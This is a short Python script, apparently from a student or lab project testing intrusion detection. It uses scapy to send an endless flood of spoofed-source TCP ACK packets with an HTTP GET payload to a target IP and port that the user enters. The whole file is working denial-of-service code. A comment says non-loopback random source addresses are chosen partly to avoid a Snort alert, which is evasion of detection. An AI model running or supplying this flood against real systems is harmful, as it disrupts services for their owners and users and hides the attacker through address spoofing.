#reem chaaban

from scapy.all import IP, TCP, send, RandIP, RandShort #IP, TCP to craft packets - RandIP, RandShort to generate random IPs and ports
from main_config import validate_ip, validate_port_or_http

target_ip = validate_ip("Enter target IP: ") #IP validated by function from main_config.py file
target_port = validate_port_or_http() #same with port


def exclude_loopback_ip(): #loopback addresses are exclusive to local operations; excluding them increases makes the attack more realistic and avoids Snort's "Bad traffic loopback traffic" 
    ip = str(RandIP())
    while ip.startswith("127."): #while loop to generate random non-loopback IP
        ip = str(RandIP())
    return ip

def http_flood(target_ip, target_port): #generates multiple HTTP GET requests targeted at victim machine

    #IP layer: randomized source IP and victim's IP (destination)
    ip_layer = IP(src=exclude_loopback_ip(), dst=target_ip)
    #UDP layer: randomized source port and specified victim port
    tcp_layer = TCP(sport=RandShort(), dport=int(target_port), flags="A") # TCP layer created; 'A' flag = TCP ACK, i.e., acknowledgement of prev packet
    #simulates HTTP GET request
    http_payload = ("GET / HTTP/1.1\r\n" "Host: {}\r\n" "Connection: keep-alive\r\n\r\n").format(target_ip) #HTTTP GET; host: target IP; connection: kept alive for persistent HTTP requests

    #combines IP layer, TCP layer, and HTTP payload -> full packet 
    packet = ip_layer / tcp_layer / http_payload

    while True:
        send(packet, verbose=False) #continuous attack

http_flood(target_ip, target_port)
